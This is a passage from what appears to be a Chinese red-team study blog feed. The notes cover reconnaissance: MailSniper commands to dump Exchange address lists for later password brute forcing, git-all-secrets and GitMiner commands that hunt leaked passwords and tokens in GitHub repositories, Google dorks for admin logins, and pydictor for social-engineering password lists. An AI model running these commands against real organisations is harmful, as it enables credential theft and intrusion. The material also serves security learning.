href="#0x03-6-查找某个文件（寻找配置文件等）" class="headerlink" title="0x03-6 查找某个文件（寻找配置文件等）"></a>0x03-6 查找某个文件（寻找配置文件等）</h3><p><code>find / -name *.cfg</code></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mailsniper.ps1获取Outlook所有联系人</title>
      <link href="/2022/03/28/mailsniper-ps1-huo-qu-outlook-suo-you-lian-xi-ren/"/>
      <url>/2022/03/28/mailsniper-ps1-huo-qu-outlook-suo-you-lian-xi-ren/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍如何获取outlook邮箱信息。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-条件"><a href="#0x01-条件" class="headerlink" title="0x01 条件"></a>0x01 条件</h2><p>掌握其中一个用户邮箱的账号密码，并且可以登录outlook</p><p>outlook地址可以是官方的也可以是目标自己搭建的，并无影响</p><h2 id="0x02目的"><a href="#0x02目的" class="headerlink" title="0x02目的"></a>0x02目的</h2><p>获取目标邮箱里的所有联系人，方便后续爆破弱口令等等</p><h2 id="0x03利用"><a href="#0x03利用" class="headerlink" title="0x03利用"></a>0x03利用</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>将尝试Outlook Web Access（OWA）和Exchange Web服务（EWS）的方法。次命令可用于从Exchange收集电子邮件列表：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain <span class="token punctuation">\</span> username -Password Spring2017 -OutFile global-address-list.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper">https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper</a></p><p><a href="https://www.cnblogs.com/backlion/p/6812690.html">https://www.cnblogs.com/backlion/p/6812690.html</a></p><h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://github.com/dafthack/mailsniper">https://github.com/dafthack/mailsniper</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-all-secret</title>
      <link href="/2022/03/26/git-all-secret/"/>
      <url>/2022/03/26/git-all-secret/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍工具git-all-secret，用于搜索github仓库。但笔者在测试的时候docker环境中的工具无法解析dns，而且不能挂起docker进入到bash，使用起来较为困难。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Git-all-secret功能描述"><a href="#Git-all-secret功能描述" class="headerlink" title="Git-all-secret功能描述"></a>Git-all-secret功能描述</h2><ul><li>克隆多个某组织的 public/private 有仓库并扫描；</li><li>克隆多个某组织用户的 public/private 仓库扫描；</li><li>克隆一个某组织的 public/private 仓库并扫描；</li><li>克隆一个某用户的 public/private 仓库并扫描；</li><li>克隆一个某用户的 public/secret gist （代码片段管理服务）并扫描；</li><li>克隆一个某组织团队的仓库并扫描；</li><li>克隆和扫描Github企业仓库还有gists；</li></ul><h2 id="扫描过程需要借助的开源工具"><a href="#扫描过程需要借助的开源工具" class="headerlink" title="扫描过程需要借助的开源工具"></a>扫描过程需要借助的开源工具</h2><ul><li>truffleHog - 扫描高熵值字符串和用户提供的正则表达式；</li><li>repo-supervisor扫描在js和json文件中的高熵值字符串；</li></ul><p>所有工具中的输出文件最终会合并为一个输出文件</p><h2 id="新手入门使用"><a href="#新手入门使用" class="headerlink" title="新手入门使用"></a>新手入门使用</h2><h4 id="下载docker"><a href="#下载docker" class="headerlink" title="下载docker"></a>下载docker</h4><p>运行Git-all-secrets最简便的方法是使用Docker</p><p>获取Docker：apt install docker docker-compose</p><h4 id="下载Git-all-secrets"><a href="#下载Git-all-secrets" class="headerlink" title="下载Git-all-secrets"></a>下载Git-all-secrets</h4><p>git clone <a href="https://github.com/anshumanbh/git-all-secrets.git">https://github.com/anshumanbh/git-all-secrets.git</a></p><h4 id="运行git-all-secrets"><a href="#运行git-all-secrets" class="headerlink" title="运行git-all-secrets"></a>运行git-all-secrets</h4><ul><li><p>运行 docker run –rm -it abhartiya/tools_gitallsecrets –help 查看帮助信息</p></li><li><p>运行 docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; 扫描组织</p></li><li><p>运行 docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -toolName=&lt;&gt; 选择待定工具，toolName=thog or repo-supervisor</p></li><li><p>运行 docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -toolName=thog -thogEntropy truffleHog 的默认正则和高熵设置</p></li><li><p>当容器完成运行，输入 docker ps -a 返回容器ID</p></li><li><p>获得容器ID以后，输入 docker cp :/root/results.txt 来获取结果文件</p></li></ul><h4 id="标志-选项"><a href="#标志-选项" class="headerlink" title="标志/选项"></a>标志/选项</h4><ul><li>-token= Github访问令牌。如果未授权请求Github API会被限速</li><li>-org= 组织扫描。他会扫描组织中的所有公共仓库，以及用户的gists。如果你使用的是该组织用户的token，他还会克隆并扫描该用户的所有私密gitsts，以及所有该用户有权限访问的私有仓库</li><li>-user= 用户扫描。他会扫描当前用户的所有仓库和gists，扫描私有仓库请使用scanPrivateReposOnly标志，以及SSHkey</li><li>-repoURL= httpsURL 仓库扫描。他只会扫描当前仓库。如果你希望扫描私有仓库，请提供SSH URL和SSHkey，以及scanPrivateReposOnly标志</li><li>-gistURL= httpsURL Gist扫描。他只会扫描Gist。如果你知道私密gist的httpsURL，他也能够访问</li><li>-output= 输出结果文件，默认是result.txt</li><li>-cloneForks= 这是一个布尔标志。默认设置为0，不克隆forks，如果设置为1，他就会克隆forks</li><li>-orgOnly= 这也是一个布尔标志。默认设置为0。如果只扫描组织仓库而不扫描用户的仓库，请将它设置为1</li><li>-toolName= 这是规范扫描工具的标志。默认他使用all，thog和repo-supervisor</li><li>-scanPrivateReposOnly= 这是规范是否扫描用户私有仓库的标志。他只能工作在user、repoURL、org标志</li><li>-enterpriseURL= 企业GithubURL的标志，如果你希望扫描企业仓库，就选这个</li><li>-threads= 默认线程10</li><li>-thogEntropy= 开启高熵提取，默认是false。设置为true会有大量的垃圾信息，在比较大的目标上，不建议开启。如果设置为false，则意味着truffleHog只会提取基于rules.json文件中的正则结果</li><li>-blacklist= 不需要扫描的仓库名称，以逗号分割</li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li><p>Token选项不能为空</p></li><li><p>Org user repoURL gistURL 不能都设置为空，至少需要提供一个选项。如果你提供了多个选项，他的顺序是org&gt;user&gt;repoURL&gt;gistURL。如果你只需要运行在特定用户上，那就不需要提供org选项</p></li><li><p>当定义scanPrivateReposOnly标志时：</p><p>​    1.必须将包含的SSH-key的卷载入到Docker容器中，使用 -v 选项</p><p>​    2.他应该在扫描私有仓库时使用，使用SSH url，而不是https url</p><p>​    3.确保使用了私有仓库/gist的用户token，否则会报错</p><p>​    4.如果你想在没有手动干扰的情况下运行，请不要设置SSH key的密钥密码</p></li><li><p>当定义teamName标志的时候，提供一个团队成 员的token非常重要，否则可能会出现意外结果</p></li><li><p>当定义enterpriseURL标志的时候，即使你提供了http URL，他也始终会考虑ssh key。所有企业克隆/扫描都是通过ssh url，而不是https url</p></li></ul><p>综上，请确保使用了SSH key，并且没有设置密钥密码</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="扫描私有仓库"><a href="#扫描私有仓库" class="headerlink" title="扫描私有仓库"></a>扫描私有仓库</h3><p>扫描私有仓库最稳妥的方法是使用SSH URL克隆。实现这个你需要将SSH key添加到Github用户。</p><p>用户配置参考：<a href="https://help.github.com/en/articles/adding-a-new-ssh-key-to-your-github-account">https://help.github.com/en/articles/adding-a-new-ssh-key-to-your-github-account</a></p><p>确保这个key没有密码设置。有了SSH key以后，将它挂载到Docker容器中，运行如下命令：</p><p><code>docker run -it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -user=&lt;&gt; -scanPrivateReposOnly</code></p><p>OR</p><p><code>docker run -it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -repoURL=&lt;&gt; -scanPrivateReposOnly</code></p><p>将本地的personal SSH-key存储到Docker内部容器 /root/.ssh/id_rsa，git-all-secrets会试图通过存储在 /root/.ssh/id_rsa 的ssh key来克隆仓库</p><h3 id="扫描组织团队"><a href="#扫描组织团队" class="headerlink" title="扫描组织团队"></a>扫描组织团队</h3><p>Github API限制了私有仓库环境。尝试使用非管理员用户扫描组织，需要给用户添加仓库的访问权限。如果非要扫描组织团队，可以运行：</p><p>docker run –it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -teamName &lt;&gt;</p><h3 id="扫描企业Github"><a href="#扫描企业Github" class="headerlink" title="扫描企业Github"></a>扫描企业Github</h3><p>git-all-secrets支持扫描企业仓库，使用enterpriseURL选项：</p><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -repoURL <a href="https://github/">https://github</a>.<org>.com/<user>/<repo>.git</p><h4 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -repoURL <a href="https://github/">https://github</a>.<org>.com/<user>/<repo>.git -toolName thog -thogEntropy</p><h4 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -user <username> -scanPrivateReposOnly</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>可以添加自己的正则表达式，在docker run的时候使用-v $(pwd)/rules.json:/root/truffleHog/rules.json。可以使用默认正则表达式，如果需要，也可以用truffleHog提供的高熵字符串。可以通过repo-supervisor工具搜索.js和.json中的高熵字符串。可以搜索用户的Gist，大多数工具都没这个功能。有新工具可以很容易地集成到git-all-secrets。支持扫描企业Github orgs/uesrs/repos/gists。大多数工具只扫描单个仓库，git-all-secrets可以一次扫描多个。</p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Hacking</title>
      <link href="/2022/03/26/google-hacking/"/>
      <url>/2022/03/26/google-hacking/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍Google中的搜索语法，利用google语法去精准定位一些页面。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table><thead><tr><th>通配符</th><th>语义</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>+</td><td>包含关键词</td><td>+前面必须要有一个空格</td><td>admin +login</td></tr><tr><td>-</td><td>排除关键词</td><td>-前面必须要有一个空格</td><td>mysql -csdn</td></tr><tr><td>~</td><td>同义词</td><td>~前面必须要有一个空格</td><td>mysql ~csdn</td></tr><tr><td>*</td><td>模糊查询</td><td>*代替任意字符</td><td>mysql**</td></tr><tr><td>“”</td><td>强调</td><td>-</td><td>“mysql”</td></tr></tbody></table><h3 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h3><p>语法：语句:关键词</p><table><thead><tr><th>语法</th><th>语义</th></tr></thead><tbody><tr><td>intitle</td><td>包含标题</td></tr><tr><td>intext</td><td>包含内容</td></tr><tr><td>filetyepe</td><td>文件类型</td></tr><tr><td>info</td><td>基本信息</td></tr><tr><td>site</td><td>指定网站</td></tr><tr><td>inurl</td><td>包含某个url</td></tr><tr><td>link</td><td>包含指定链接的网页</td></tr><tr><td>cache</td><td>显示页面的缓存版本</td></tr><tr><td>numberange</td><td>搜索一个数字</td></tr></tbody></table><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><img src="https://imgtp.apqiang.com/2022/03/26/0ZuyuNYp.png"></p><ul><li>搜索目标包含后台的页面</li></ul><p><code>site:&quot;some-keywords.com&quot; intitle:login intext: 管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system</code></p><ul><li>搜索目标是否有列目录</li></ul><p><code>site:&quot;some-keywords.com&quot; intext: index of / | ../ | Parent Directory</code></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Hacking</title>
      <link href="/2022/03/26/github-hacking/"/>
      <url>/2022/03/26/github-hacking/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍Github中的搜索语法，查询项目公开的源码。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Github-Hacking"><a href="#Github-Hacking" class="headerlink" title="Github Hacking"></a>Github Hacking</h2><p>您可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有GitHub存储库：</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ul><li>Repositories</li><li>Topics</li><li>Issues and pull requests</li><li>Code</li><li>Commits</li><li>Users</li><li>Wikis</li></ul><p>参考：</p><ul><li>Searching for repositories</li><li>Searching topics</li><li>Searching code</li><li>Searching commits</li><li>Searching issues and pull requests</li><li>Searching users</li><li>Searching wikis</li><li>Searching in forks</li></ul><p>您可以使用 <em>搜索</em> 页面或 <em>高级搜索</em> 页面搜索GitHub。</p><p>您可以使用 &gt; , &gt;= , &lt; , 和 &lt;= 搜索是大于，大于或等于，小于和小于或等于另一个值的值。</p><h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a>搜索仓库</h3><table><thead><tr><th>Query</th><th>Example</th></tr></thead><tbody><tr><td>&gt;_n_</td><td>cats stars:&gt;1000 匹配关键字”cats”且star大于1000的仓库</td></tr><tr><td>&gt;=_n_</td><td>cats topics:&gt;=5 匹配关键字”cats”且标签数量大于等于5的仓库</td></tr><tr><td>&lt;_n_</td><td>cats size:&lt;10000 匹配关键字”cats”且文件小于10KB的仓库</td></tr><tr><td>&lt;=_n_</td><td>cats stars:&lt;=50 匹配关键字”cats”且star小于等于50的仓库</td></tr><tr><td>_n_..*</td><td>cats stars:10..* 匹配关键字”cats”且star大于10的仓库</td></tr><tr><td>*.._n_</td><td>cats stars:*..10 匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td>n..n</td><td>cats stars:10..50 匹配关键字”cats”且star大于10且小于50的仓库</td></tr><tr><td>_n_..*</td><td>cats stars:10..* 匹配关键字”cats”且star大于等于10的仓库</td></tr><tr><td>*.._n_</td><td>cats stars:*..10 匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td>n..n</td><td>cats stars:10..50 匹配关键字”cats”且star大于10且小于50的仓库</td></tr></tbody></table><h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>只能搜索小于384 KB的文件</li><li>只能搜索小于500,000个文件的存储库</li><li>登录的用户可以搜索所有公共存储库</li><li>除 filename 搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索 language:javascript 无效，而是这样： amazing language:javascript。</li><li>搜索结果最多可以显示来自同一个文件的两个片段，但文件中可能会有更多结果。</li><li>您不能将以下通配符用作搜索查询的一部分：. , : ; / \ ‘ “ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]。搜索将忽略这些符号。</li></ul><h4 id="日期条件"><a href="#日期条件" class="headerlink" title="日期条件"></a>日期条件</h4><p>cats pushed:&lt;2012-07-05 搜索在2012年07月05日前push代码，且cats作为关键字</p><p>cats pushed:2016-04-30..2016-07-04 日期区间</p><p>cats created:&gt;=2017-04-01 创建时间</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>AND、OR、NOT</p><h4 id="排除运算"><a href="#排除运算" class="headerlink" title="排除运算"></a>排除运算</h4><p>cats pushed:&lt;2012-07-05 -language:java 搜索在2012年07月05日前push代码，且cats作为关键字，排除 java 语言仓库。</p><h4 id="包含搜索"><a href="#包含搜索" class="headerlink" title="包含搜索"></a>包含搜索</h4><p>cats in:file 搜索文件中包含cats的代码</p><p>cats in:path 搜索路径中包含cats的代码</p><p>cats in:path,file 搜索路劲、文件中包含cats的代码</p><p>console path:app/public language:javascript 搜索关键字console，且语言为javascript，在app/public下的代码</p><h4 id="主题搜索"><a href="#主题搜索" class="headerlink" title="主题搜索"></a>主题搜索</h4><p>user:USERNAME 用户名搜索</p><p>org:ORGNAME 组织搜索</p><p>repo:USERNAME/REPOSITORY 指定仓库搜索</p><h4 id="文件大小"><a href="#文件大小" class="headerlink" title="文件大小"></a>文件大小</h4><p>size:&gt;1000 搜索大小大于1KB的文件</p><h4 id="文件名称"><a href="#文件名称" class="headerlink" title="文件名称"></a>文件名称</h4><p>filename:config.php language:php 搜索文件名为config.php，且语言为php的代码。例如搜索Java项目配置文件：mail filename:.properties</p><p><img src="https://img1.imgtp.com/2022/03/26/Du5ZaVml.png"></p><h4 id="扩展名"><a href="#扩展名" class="headerlink" title="扩展名"></a>扩展名</h4><p>extension:EXTENSION 指定扩展名搜索</p><p>例如：extension:properties jdbc</p><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 gitminer-v2.0.py -c cookie.txt  -q <span class="token string">'extension:properties jdbc'</span> -r <span class="token string">'password(.*)'</span> -m passwords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要将cookie信息存入文件中</p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开放漏洞情报&amp;开源情报信息收集（OSINT）</title>
      <link href="/2022/03/25/kai-yuan-lou-dong-qing-bao/"/>
      <url>/2022/03/25/kai-yuan-lou-dong-qing-bao/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍常见的漏洞信息收集和常见的情报信息收集。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="开发漏洞情报"><a href="#开发漏洞情报" class="headerlink" title="开发漏洞情报"></a>开发漏洞情报</h2><h3 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h3><ul><li>CVE <a href="https://cve.mitre.org/">https://cve.mitre.org</a></li><li>Exploit-DB <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>CX Security <a href="https://cxsecurity.com/">https://cxsecurity.com/</a></li><li>CNVD <a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li><li>securitytracker （网站现已关闭）</li></ul><h3 id="Search-Exploit-DB"><a href="#Search-Exploit-DB" class="headerlink" title="Search Exploit-DB"></a>Search Exploit-DB</h3><p><img src="https://img1.imgtp.com/2022/03/25/dJp5wuQ4.png"></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>搜索Windows提权漏洞</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">searchsploit -t windows <span class="token builtin class-name">local</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/03/25/Sd0TTUUZ.png"></p><p>搜索Apache漏洞</p><p><img src="https://img1.imgtp.com/2022/03/25/Gu6eUnjF.png"></p><h2 id="开源情报信息搜集（OSINT）"><a href="#开源情报信息搜集（OSINT）" class="headerlink" title="开源情报信息搜集（OSINT）"></a>开源情报信息搜集（OSINT）</h2><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><ul><li>百度 <a href="http://www.baidu.com/">http://www.baidu.com</a></li><li>谷歌 <a href="http://www.google.com/">http://www.google.com</a></li><li>必应 <a href="http://www.bing.com/">http://www.bing.com</a></li></ul><h3 id="在线接口"><a href="#在线接口" class="headerlink" title="在线接口"></a>在线接口</h3><table><thead><tr><th>url</th><th>简介</th></tr></thead><tbody><tr><td><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></td><td>主要解析域名ip，同时提供该同服ip站点列表，但多数解析为cdn</td></tr><tr><td><a href="https://search.censys.io/">https://search.censys.io/</a></td><td>根据ip查询开启的服务信息，查看子域关系图。也可以根据body信息查询含有关键字的主机</td></tr><tr><td><a href="https://crt.sh/">https://crt.sh/</a></td><td>可以查询域的OU信息和证书信息</td></tr><tr><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td><td>加载较慢，可以查询解析的ip和开启的服务以及服务器的地域</td></tr><tr><td><a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a></td><td>关系图、whois信息、dns历史解析、开启的服务、子域以及对应的IP</td></tr><tr><td><a href="https://dnslytics.com/">https://dnslytics.com</a></td><td>根据域名可以查询顶级域不同的域名，可查询路由信息和信息提供者。根据ip查询可以较全的whois信息和开启的服务</td></tr><tr><td><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a></td><td>可以扫描子域名，但是每天只有一次免费的机会，该网站的在线工具都是付费使用</td></tr><tr><td><a href="https://viewdns.info/">https://viewdns.info</a></td><td>有挺多功能，反查ip、whois查询、ip历史、端口扫描等，但是加载慢</td></tr><tr><td><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></td><td>需要注册、邀请码</td></tr><tr><td><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></td><td>可以查询访问量、子域等</td></tr><tr><td><a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></td><td>爆破子域名</td></tr></tbody></table><h3 id="相关整合工具"><a href="#相关整合工具" class="headerlink" title="相关整合工具"></a>相关整合工具</h3><p><a href="https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md</a></p><p>在线恶意软件分析整合</p><h3 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h3><p><a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p><p><a href="https://viewdns.info/">https://viewdns.info/</a></p><h3 id="信息收集在线工具合集"><a href="#信息收集在线工具合集" class="headerlink" title="信息收集在线工具合集"></a>信息收集在线工具合集</h3><p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关联信息生成</title>
      <link href="/2022/03/25/guan-lian-xin-xi-sheng-cheng/"/>
      <url>/2022/03/25/guan-lian-xin-xi-sheng-cheng/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍利用已经收集的个人信息来生成字典。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="关联信息生成"><a href="#关联信息生成" class="headerlink" title="关联信息生成"></a>关联信息生成</h2><p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、拆分、组合。</p><p>例如：赫尔巴斯亚基国</p><p>根据地域习惯、宗教、互联网开发信息等信息进行简要拆分，假设获取的信息如下：</p><ul><li>当地人爱好吃橙子</li><li>当地人信奉伊斯兰教</li><li>IPV4地址开放IP段</li><li>相关社交网络公开的数据库</li></ul><p>根据宗教、习惯、IP地址、开放数据支持……等，为后续的字典生成、鱼叉、水坑攻击铺下基石。</p><h2 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h2><h3 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/LandGrey/pydictor.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h4><p><img src="https://img1.imgtp.com/2022/03/25/Xb0E9vMT.png"></p><p>快速使用：<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$python3</span> pydictor.py --sedb                              _ _      _              _ __  _   _  __<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___<span class="token operator">|</span> <span class="token operator">|</span>_ ___  _ __             <span class="token operator">|</span> <span class="token string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__<span class="token operator">|</span>             <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>             <span class="token operator">|</span> .__/ <span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>             <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>___/                                            Social Engineering Dictionary Builder                                            Build by LandGrey    ----------------------------<span class="token punctuation">[</span> <span class="token builtin class-name">command</span> <span class="token punctuation">]</span>----------------------------    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>help desc             <span class="token punctuation">[</span>+<span class="token punctuation">]</span>exit/quit            <span class="token punctuation">[</span>+<span class="token punctuation">]</span>clear/cls    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>show option           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>set option arguments <span class="token punctuation">[</span>+<span class="token punctuation">]</span>rm option    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>len minlen maxlen     <span class="token punctuation">[</span>+<span class="token punctuation">]</span>head prefix          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>tail suffix    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>encode <span class="token builtin class-name">type</span>           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>occur L d s          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>types L d s    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>regex string          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>level code           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>leet code    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>output directory      <span class="token punctuation">[</span>+<span class="token punctuation">]</span>run    ----------------------------<span class="token punctuation">[</span> option <span class="token punctuation">]</span>----------------------------    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>cname                 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>ename                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>sname    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>birth                 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>usedpwd              <span class="token punctuation">[</span>+<span class="token punctuation">]</span>phone    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>uphone                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>hphone               <span class="token punctuation">[</span>+<span class="token punctuation">]</span>email    <span class="token punctuation">[</span>+<span class="token 